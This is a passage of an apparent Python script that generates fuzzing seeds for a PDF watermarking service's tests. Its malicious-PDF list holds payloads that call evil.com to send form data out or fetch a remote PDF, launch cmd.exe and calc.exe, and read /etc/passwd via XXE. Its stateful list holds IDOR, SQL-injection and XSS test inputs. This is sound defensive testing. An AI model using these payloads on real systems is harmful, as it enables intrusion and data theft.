            b"%PDF-1.4\\n1 0 obj" + b"[" * 100 + b"]" * 100 + b"endobj\\n%%EOF",
        ),
        (
            "malformed_huge_object_num.bin",
            b"%PDF-1.4\\n9999999999 0 obj<<>>endobj\\n%%EOF",
        ),
        (
            "malformed_invalid_xref_offset.bin",
            b"%PDF-1.4\\nxref\\n0 1\\ntrailer<<>>\\nstartxref\\n999999\\n%%EOF",
        ),
        (
            "malformed_null_bytes.bin",
            b"%PDF-1.4\\x00\\x00\\x00\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        ("malformed_only_header.bin", b"%PDF-1.4\\n"),
        ("malformed_reversed_eof.bin", b"%PDF-1.4\\n1 0 obj<<>>endobj\\nFOE%%"),
        (
            "malformed_extra_spaces_header.bin",
            b"%    PDF    -    1.4\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        ("malformed_tabs_in_header.bin", b"%PDF\\t-\\t1.4\\n1 0 obj<<>>endobj\\n%%EOF"),
        (
            "malformed_mixed_line_endings.bin",
            b"%PDF-1.4\\r\\n1 0 obj<<>>endobj\\r%%EOF\\n",
        ),
        (
            "malformed_very_long_line.bin",
            b"%PDF-1.4\\n1 0 obj<<" + b"A" * 100000 + b">>endobj\\n%%EOF",
        ),
        (
            "malformed_invalid_dict_key.bin",
            b"%PDF-1.4\\n1 0 obj<</123invalid/value>>endobj\\n%%EOF",
        ),
        (
            "malformed_name_overflow.bin",
            b"%PDF-1.4\\n1 0 obj<</" + b"A" * 100000 + b" 1>>endobj\\n%%EOF",
        ),
        (
            "malformed_string_overflow.bin",
            b"%PDF-1.4\\n1 0 obj(" + b"A" * 100000 + b")endobj\\n%%EOF",
        ),
        ("malformed_mixed_endobj.bin", b"%PDF-1.4\\n1 0 obj<<>>EnDoBj\\n%%EOF"),
    ]

    # PDFs with specific features that might trigger edge cases (20 seeds)
    edge_case_pdfs = [
        ("edge_empty_file.bin", b""),
        ("edge_only_header.bin", b"%PDF-1.4"),
        ("edge_only_eof.bin", b"%%EOF"),
        ("edge_whitespace_only.bin", b"     \\n\\n\\n     "),
        (
            "edge_null_catalog.bin",
            b"%PDF-1.4\\n1 0 obj null endobj\\nxref\\n0 1\\ntrailer<</Root 1 0 R>>\\nstartxref\\n0\\n%%EOF",
        ),
        (
            "edge_empty_catalog.bin",
            b"%PDF-1.4\\n1 0 obj<<>>endobj\\nxref\\n0 1\\ntrailer<</Root 1 0 R>>\\nstartxref\\n0\\n%%EOF",
        ),
        (
            "edge_empty_pages.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\\n2 0 obj<<>>endobj\\n%%EOF",
        ),
        (
            "edge_zero_pages.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\\n2 0 obj<</Type/Pages/Count 0>>endobj\\n%%EOF",
        ),
        (
            "edge_negative_pages.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\\n2 0 obj<</Type/Pages/Count -1>>endobj\\n%%EOF",
        ),
        (
            "edge_huge_page_count.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\\n2 0 obj<</Type/Pages/Count 999999>>endobj\\n%%EOF",
        ),
        (
            "edge_invalid_mediabox.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[1000 1000 0 0]>>endobj\\n%%EOF",
        ),
        (
            "edge_huge_mediabox.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[0 0 999999 999999]>>endobj\\n%%EOF",
        ),
        (
            "edge_negative_dimensions.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[0 0 -100 -100]>>endobj\\n%%EOF",
        ),
        (
            "edge_zero_dimensions.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[0 0 0 0]>>endobj\\n%%EOF",
        ),
        (
            "edge_float_dimensions.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[0.5 0.5 612.5 792.5]>>endobj\\n%%EOF",
        ),
        (
            "edge_string_dimensions.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Page/MediaBox[(zero)(zero)(big)(big)]>>endobj\\n%%EOF",
        ),
        (
            "edge_mixed_types_array.bin",
            b"%PDF-1.4\\n1 0 obj[1 (string) true null << /Dict /val >> [nested]]endobj\\n%%EOF",
        ),
        (
            "edge_deeply_nested_dict.bin",
            b"%PDF-1.4\\n1 0 obj<<" + b"/N<<" * 50 + b">>" * 50 + b">>endobj\\n%%EOF",
        ),
        (
            "edge_self_referencing.bin",
            b"%PDF-1.4\\n1 0 obj<</Self 1 0 R>>endobj\\n%%EOF",
        ),
        (
            "edge_binary_stream.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 10>>stream\\n\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\nendstream\\nendobj\\n%%EOF",
        ),
    ]

    # PDFs with potentially malicious content (40 seeds)
    malicious_pdfs = [
        # JavaScript exploits
        (
            "malicious_js_alert.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/AA<</O<</S/JavaScript/JS(app.alert('XSS'))>>>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_js_app_launch.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.launchURL('http://evil.com'))>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_js_submit_form.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/AA<</O<</S/SubmitForm/F(http://evil.com/steal)>>>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_js_geturl.bin",
            b"%PDF-1.4\\n1 0 obj<</S/JavaScript/JS(getURL('http://evil.com'))>>endobj\\n%%EOF",
        ),
        (
            "malicious_js_exportdata.bin",
            b"%PDF-1.4\\n1 0 obj<</S/JavaScript/JS(exportDataObject({cName:'evil'}))>>endobj\\n%%EOF",
        ),
        # File attachments
        (
            "malicious_attachment_exe.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\n2 0 obj<</Type/Filespec/F(evil.exe)/EF<</F 3 0 R>>>>endobj\\n3 0 obj<</Length 5>>stream\\nMZ\\x90\\x00\\nendstream\\nendobj\\n%%EOF",
        ),
        (
            "malicious_attachment_zip.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Filespec/F(archive.zip)>>endobj\\n%%EOF",
        ),
        (
            "malicious_attachment_hidden.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Filespec/F()/UF(hidden.exe)>>endobj\\n%%EOF",
        ),
        # Launch actions
        (
            "malicious_launch_action.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/OpenAction<</S/Launch/F(calc.exe)>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_launch_win.bin",
            b"%PDF-1.4\\n1 0 obj<</S/Launch/Win<</F(cmd.exe)/P(/c whoami)>>>>endobj\\n%%EOF",
        ),
        # URI actions
        (
            "malicious_uri_action.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/OpenAction<</S/URI/URI(http://evil.com/track?pdf=opened)>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_uri_file.bin",
            b"%PDF-1.4\\n1 0 obj<</S/URI/URI(file:///c:/windows/system32/calc.exe)>>endobj\\n%%EOF",
        ),
        # GoTo actions with exploits
        (
            "malicious_goto_remote.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/OpenAction<</S/GoToR/F(http://evil.com/exploit.pdf)>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_goto_embedded.bin",
            b"%PDF-1.4\\n1 0 obj<</S/GoToE/T<</R/C/N(EmbeddedFile)>>>>endobj\\n%%EOF",
        ),
        # Object stream exploits
        (
            "malicious_objstm_compressed.bin",
            b"%PDF-1.5\\n1 0 obj<</Type/ObjStm/N 10/First 50/Length 200/Filter/FlateDecode>>stream\\ncompressed objects\\nendstream\\nendobj\\n%%EOF",
        ),
        # Incremental updates (hiding content)
        (
            "malicious_incremental_update.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\nxref\\n0 1\\ntrailer<</Root 1 0 R>>\\nstartxref\\n0\\n%%EOF\\n1 0 obj<</Type/Catalog/AA<<>>>>endobj\\nxref\\n1 1\\ntrailer<</Root 1 0 R/Prev 0>>\\nstartxref\\n100\\n%%EOF",
        ),
        # Encryption-related
        (
            "malicious_weak_encryption.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\ntrailer<</Root 1 0 R/Encrypt<</Filter/Standard/V 1/R 2/O(owner)/U(user)/P -1>>>>>>\\n%%EOF",
        ),
        # Content stream exploits
        (
            "malicious_content_js.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 50>>stream\\nq\\n/JS <</S /JavaScript /JS (app.alert(1))>>\\nQ\\nendstream\\nendobj\\n%%EOF",
        ),
        # Metadata exploits
        (
            "malicious_metadata_xxe.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Metadata/Subtype/XML/Length 100>>stream\\n<?xml version='1.0'?><!DOCTYPE r[<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>\\nendstream\\nendobj\\n%%EOF",
        ),
        (
            "malicious_metadata_large.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Metadata/Length 1000000>>stream\\n"
            + b"A" * 1000000
            + b"\\nendstream\\nendobj\\n%%EOF",
        ),
        # Font exploits
        (
            "malicious_font_name.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Font/BaseFont/"
            + b"A" * 10000
            + b">>endobj\\n%%EOF",
        ),
        # Image exploits
        (
            "malicious_image_dimensions.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/XObject/Subtype/Image/Width 999999/Height 999999/BitsPerComponent 8>>endobj\\n%%EOF",
        ),
        (
            "malicious_image_colorspace.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/XObject/Subtype/Image/Width 1/Height 1/ColorSpace[/Indexed/DeviceRGB 255 <>"
            + b"FF" * 256
            + b">]>>endobj\\n%%EOF",
        ),
        # Name tree exploits
        (
            "malicious_names_overflow.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/Names<</Dests<</Names["
            + b"(name) 1 0 R " * 10000
            + b"]>>>>>>endobj\\n%%EOF",
        ),
        # Page tree exploits
        (
            "malicious_page_tree_deep.bin",
            b"%PDF-1.4\\n"
            + b"\\n".join(
                [
                    f"{i} 0 obj<</Type/Pages/Kids[{i + 1} 0 R]>>endobj".encode()
                    for i in range(1, 100)
                ]
            )
            + b"\\n%%EOF",
        ),
        # Outlines exploits
        (
            "malicious_outline_js.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Outlines/Count 1/First 2 0 R>>endobj\\n2 0 obj<</Title(Click me)/A<</S/JavaScript/JS(app.alert(1))>>>>endobj\\n%%EOF",
        ),
        # AcroForm exploits
        (
            "malicious_form_js.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/AcroForm<</Fields[2 0 R]>>>>endobj\\n2 0 obj<</FT/Tx/T(field)/AA<</K<</S/JavaScript/JS(app.alert(1))>>>>>>endobj\\n%%EOF",
        ),
        (
            "malicious_form_submit.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog/AcroForm<</Fields[2 0 R]>>>>endobj\\n2 0 obj<</FT/Tx/AA<</F<</S/SubmitForm/F(http://evil.com/steal)>>>>>>endobj\\n%%EOF",
        ),
        # Signature exploits
        (
            "malicious_signature_bypass.bin",
            b"%PDF-1.4\\n1 0 obj<</Type/Catalog>>endobj\\ntrailer<</Root 1 0 R/Info<</Author(Signed by: Admin)/Producer(Fake Signer)>>>>\\n%%EOF",
        ),
        # Polyglot files
        (
            "malicious_polyglot_zip.bin",
            b"PK\\x03\\x04%PDF-1.4\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        (
            "malicious_polyglot_jpg.bin",
            b"\\xFF\\xD8\\xFF\\xE0%PDF-1.4\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        # Filter exploits
        (
            "malicious_filter_chain.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 100/Filter[/ASCIIHexDecode/ASCII85Decode/LZWDecode/FlateDecode/RunLengthDecode]>>stream\\ndata\\nendstream\\nendobj\\n%%EOF",
        ),
        (
            "malicious_filter_params.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 10/Filter/FlateDecode/DecodeParms<</Predictor 12/Columns 999999>>>>stream\\ndata\\nendstream\\nendobj\\n%%EOF",
        ),
        # Trailer exploits
        (
            "malicious_trailer_size.bin",
            b"%PDF-1.4\\n1 0 obj<<>>endobj\\nxref\\n0 1\\ntrailer<</Size 999999/Root 1 0 R>>\\nstartxref\\n0\\n%%EOF",
        ),
        (
            "malicious_trailer_prev_loop.bin",
            b"%PDF-1.4\\ntrailer<</Prev 0>>\\nstartxref\\n0\\n%%EOF",
        ),
        # Hybrid-reference exploits
        (
            "malicious_hybrid_xref.bin",
            b"%PDF-1.5\\n1 0 obj<</Type/XRef>>stream\\nxref stream data\\nendstream\\nendobj\\nxref\\n0 1\\ntrailer<</Root 1 0 R>>\\nstartxref\\n0\\n%%EOF",
        ),
        # Resource limits
        (
            "malicious_infinite_loop_obj.bin",
            b"%PDF-1.4\\n1 0 obj<</Next 1 0 R>>endobj\\n%%EOF",
        ),
        (
            "malicious_memory_bomb.bin",
            b"%PDF-1.4\\n1 0 obj<</Length 1000000>>stream\\n"
            + b"\\x00" * 1000000
            + b"\\nendstream\\nendobj\\n%%EOF",
        ),
        # Unicode exploits
        (
            "malicious_unicode_bom.bin",
            b"\\xEF\\xBB\\xBF%PDF-1.4\\n1 0 obj<<>>endobj\\n%%EOF",
        ),
        (
            "malicious_rtl_override.bin",
            b"%PDF-1.4\\n1 0 obj<</Title(evil\\u202Efdp.exe)>>endobj\\n%%EOF",
        ),
    ]

    # Combine all
    all_seeds = minimal_pdfs + malformed_pdfs + edge_case_pdfs + malicious_pdfs

    for filename, content in all_seeds:
        # Process escape sequences in byte strings
        content = (
            content.replace(b"\\n", b"\n").replace(b"\\r", b"\r").replace(b"\\t", b"\t")
        )
        content = content.replace(b"\\x", b"\\\\x")  # Keep \x as literal for now
        # Note: Proper hex decoding would need more sophisticated parsing
        write_seed(seed_dir, filename, content)

    print(f"✓ Created {len(all_seeds)} watermarking fuzzer seeds")


def create_stateful_fuzzer_seeds() -> None:
    """Create seeds for stateful fuzzer - 100+ workflow patterns."""
    seed_dir = Path("server/fuzz/seeds/stateful_fuzzer")
    ensure_dir(seed_dir)

    seeds = []

    # Valid workflows (20 seeds)
    valid_workflows = [
        (
            "workflow_create_and_login.bin",
            [
                {
                    "action": "create_user",
                    "email": "newuser@test.com",
                    "password": "SecurePass123!",
                },
                {
                    "action": "login",
                    "email": "newuser@test.com",
                    "password": "SecurePass123!",
                },
            ],
        ),
        (
            "workflow_full_document_lifecycle.bin",
            [
                {
                    "action": "login",
                    "email": "user@test.com",
                    "password": "password123",
                },
                {
                    "action": "upload",
                    "intended_for": "recipient@test.com",
                    "method": "basic",
                },
                {"action": "list_documents"},
                {"action": "create_watermark", "documentid": 1, "method": "dct"},
                {"action": "read_watermark", "documentid": 1},
                {"action": "delete_document", "documentid": 1},
            ],
        ),
        (
            "workflow_multiple_uploads.bin",
            [
                {
                    "action": "login",
                    "email": "user@test.com",
                    "password": "password123",
                },
                {
                    "action": "upload",
                    "intended_for": "alice@test.com",
                    "method": "basic",
                },
                {
                    "action": "upload",
                    "intended_for": "bob@test.com",
                    "method": "advanced",
                },
                {
                    "action": "upload",
                    "intended_for": "charlie@test.com",
                    "method": "dct",
                },
            ],
        ),
        (
            "workflow_watermark_all_methods.bin",
            [
                {
                    "action": "login",
                    "email": "user@test.com",
                    "password": "password123",
                },
                {"action": "get_methods"},
                {"action": "create_watermark", "documentid": 1, "method": "basic"},
                {"action": "create_watermark", "documentid": 1, "method": "advanced"},
                {"action": "create_watermark", "documentid": 1, "method": "dct"},
            ],
        ),
        (
            "workflow_version_management.bin",
            [
                {
                    "action": "login",
                    "email": "user@test.com",
                    "password": "password123",
                },
                {"action": "create_watermark", "documentid": 1, "method": "basic"},
                {"action": "list_versions", "documentid": 1},
                {"action": "list_all_versions"},
                {"action": "get_version", "link": "test-link"},
            ],
        ),
    ]

    # Generate more valid workflows programmatically
    for i in range(15):
        valid_workflows.append(
            (
                f"workflow_rapid_operations_{i}.bin",
                [
                    {
                        "action": "login",
                        "email": f"user{i}@test.com",
                        "password": "pass",
                    },
                    {"action": "upload", "intended_for": f"recipient{i}@test.com"},
                    {"action": "list_documents"},
                    {"action": "delete_document", "documentid": i},
                ],
            )
        )

    # IDOR attacks (20 seeds)
    idor_attacks = [
        (
            "idor_access_other_user_doc.bin",
            [
                {"action": "login", "email": "attacker@test.com", "password": "pass"},
                {
                    "action": "get_document",
                    "documentid": 999,
                },  # Document belonging to another user
            ],
        ),
        (
            "idor_delete_other_user_doc.bin",
            [
                {"action": "login", "email": "attacker@test.com", "password": "pass"},
                {"action": "delete_document", "documentid": 999},
            ],
        ),
        (
            "idor_watermark_other_doc.bin",
            [
                {"action": "login", "email": "attacker@test.com", "password": "pass"},
                {"action": "create_watermark", "documentid": 999, "method": "basic"},
            ],
        ),
        (
            "idor_read_watermark_other_doc.bin",
            [
                {"action": "login", "email": "attacker@test.com", "password": "pass"},
                {"action": "read_watermark", "documentid": 999},
            ],
        ),
        (
            "idor_enumerate_documents.bin",
            [
                {"action": "login", "email": "attacker@test.com", "password": "pass"},
                *[{"action": "get_document", "documentid": i} for i in range(1, 11)],
            ],
        ),
        (
            "idor_negative_documentid.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "get_document", "documentid": -1},
            ],
        ),
        (
            "idor_zero_documentid.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "get_document", "documentid": 0},
            ],
        ),
        (
            "idor_huge_documentid.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "get_document", "documentid": 2147483647},
            ],
        ),
        (
            "idor_string_documentid.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "get_document", "documentid": "admin"},
            ],
        ),
        (
            "idor_array_documentid.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "get_document", "documentid": [1, 2, 3]},
            ],
        ),
    ]

    # Generate more IDOR variations
    for i in range(10):
        idor_attacks.append(
            (
                f"idor_scan_range_{i}.bin",
                [
                    {
                        "action": "login",
                        "email": "scanner@test.com",
                        "password": "pass",
                    },
                    *[
                        {"action": "get_document", "documentid": j}
                        for j in range(i * 10, (i + 1) * 10)
                    ],
                ],
            )
        )

    # Session management attacks (20 seeds)
    session_attacks = [
        (
            "session_no_login_access.bin",
            [
                {"action": "list_documents"}  # Try without logging in
            ],
        ),
        (
            "session_logout_and_access.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "logout"},
                {"action": "list_documents"},  # Try after logout
            ],
        ),
        (
            "session_expired_token.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "sleep", "seconds": 3600},  # Wait for token to expire
                {"action": "list_documents"},
            ],
        ),
        (
            "session_token_reuse.bin",
            [
                {"action": "login", "email": "user1@test.com", "password": "pass"},
                {"action": "save_token"},
                {"action": "login", "email": "user2@test.com", "password": "pass"},
                {"action": "restore_token"},  # Try to use user1's token
                {"action": "list_documents"},
            ],
        ),
        (
            "session_concurrent_logins.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {
                    "action": "login",
                    "email": "user@test.com",
                    "password": "pass",
                },  # Login again
            ],
        ),
        (
            "session_invalid_token.bin",
            [
                {"action": "set_token", "token": "invalid_token_12345"},
                {"action": "list_documents"},
            ],
        ),
        (
            "session_empty_token.bin",
            [{"action": "set_token", "token": ""}, {"action": "list_documents"}],
        ),
        (
            "session_malformed_token.bin",
            [
                {"action": "set_token", "token": ":::invalid:::"},
                {"action": "list_documents"},
            ],
        ),
        (
            "session_sql_injection_token.bin",
            [
                {"action": "set_token", "token": "' OR '1'='1"},
                {"action": "list_documents"},
            ],
        ),
        (
            "session_xss_in_token.bin",
            [
                {"action": "set_token", "token": "<script>alert(1)</script>"},
                {"action": "list_documents"},
            ],
        ),
    ]

    # Generate more session attacks
    for i in range(10):
        session_attacks.append(
            (
                f"session_rapid_login_logout_{i}.bin",
                [
                    {
                        "action": "login",
                        "email": f"user{i}@test.com",
                        "password": "pass",
                    },
                    {"action": "logout"},
                    {
                        "action": "login",
                        "email": f"user{i}@test.com",
                        "password": "pass",
                    },
                    {"action": "logout"},
                ]
                * 5,
            )
        )

    # Race condition tests (20 seeds)
    race_conditions = [
        (
            "race_simultaneous_upload.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {
                    "action": "concurrent_upload",
                    "count": 10,
                    "intended_for": "test@test.com",
                },
            ],
        ),
        (
            "race_simultaneous_delete.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "concurrent_delete", "documentid": 1, "count": 10},
            ],
        ),
        (
            "race_create_watermark.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {
                    "action": "concurrent_watermark",
                    "documentid": 1,
                    "method": "basic",
                    "count": 10,
                },
            ],
        ),
        (
            "race_read_and_delete.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "concurrent_read_delete", "documentid": 1},
            ],
        ),
        (
            "race_double_spend_document.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {
                    "action": "concurrent_create_watermark",
                    "documentid": 1,
                    "methods": ["basic", "advanced"],
                },
            ],
        ),
    ]

    # Generate more race condition tests
    for i in range(15):
        race_conditions.append(
            (
                f"race_mixed_operations_{i}.bin",
                [
                    {"action": "login", "email": "user@test.com", "password": "pass"},
                    {
                        "action": "concurrent_mixed",
                        "operations": [
                            {"action": "upload", "intended_for": "test@test.com"},
                            {"action": "list_documents"},
                            {"action": "delete_document", "documentid": i},
                            {
                                "action": "create_watermark",
                                "documentid": i + 1,
                                "method": "basic",
                            },
                        ],
                    },
                ],
            )
        )

    # State transition attacks (20 seeds)
    state_attacks = [
        (
            "state_delete_then_access.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "delete_document", "documentid": 1},
                {"action": "get_document", "documentid": 1},  # Access after deletion
            ],
        ),
        (
            "state_watermark_deleted_doc.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "delete_document", "documentid": 1},
                {"action": "create_watermark", "documentid": 1, "method": "basic"},
            ],
        ),
        (
            "state_duplicate_watermark.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "create_watermark", "documentid": 1, "method": "basic"},
                {
                    "action": "create_watermark",
                    "documentid": 1,
                    "method": "basic",
                },  # Same method twice
            ],
        ),
        (
            "state_read_before_create_watermark.bin",
            [
                {"action": "login", "email": "user@test.com", "password": "pass"},
                {"action": "read_watermark", "documentid": 1},  # Read before creating
            ],
        ),
        (
            "state_invalid_transition.bin",
            [
                {
                    "action": "create_watermark",
                    "documentid": 1,
                    "method": "basic",
                },  # Before login
                {"action": "login", "email": "user@test.com", "password": "pass"},
            ],
        ),
    ]

    # Generate more state attacks
    for i in range(15):
        state_attacks.append(
            (
                f"state_chaos_operations_{i}.bin",
                [
                    {"action": "delete_document", "documentid": i},
                    {"action": "login", "email": "user@test.com", "password": "pass"},
                    {"action": "get_document", "documentid": i},
                    {"action": "create_watermark", "documentid": i, "method": "basic"},
                    {"action": "logout"},
                    {"action": "read_watermark", "documentid": i},
                    {"action": "upload", "intended_for": "test@test.com"},
                ],
            )
        )

    # Combine all
    all_seeds = (
        valid_workflows
        + idor_attacks
        + session_attacks
        + race_conditions
        + state_attacks
    )

    # Write seeds
    for filename, workflow in all_seeds:
        content = json.dumps(workflow).encode("utf-8")
        write_seed(seed_dir, filename, content)

    print(f"✓ Created {len(all_seeds)} stateful fuzzer seeds")


def main() -> None:
    """Create all seed corpora."""
    print("=" * 60)
    print("Creating comprehensive fuzzing seed corpora")
    print("=" * 60)
    print()

    print("📦 Creating API fuzzer seeds...")
    create_api_fuzzer_seeds()
    print()

    print("📦 Creating input validation fuzzer seeds...")
    create_inputs_fuzzer_seeds()
    print()

    print("📦 Creating watermarking fuzzer seeds...")
    create_watermarking_fuzzer_seeds()
    print()

    print("📦 Creating stateful fuzzer seeds...")
    create_stateful_fuzzer_seeds()
    print()

    print("=" * 60)
    print("✅ All seed corpora created successfully!")
    print("=" * 60)
    print()
    print("Next steps:")
    print("1. Review seeds: ls -lh server/fuzz/seeds/*/")
    print("2. Run fuzzers: docker compose up fuzzer")
    print("3. Monitor results in fuzzing_results_*/")


if __name__ == "__main__":
    main()
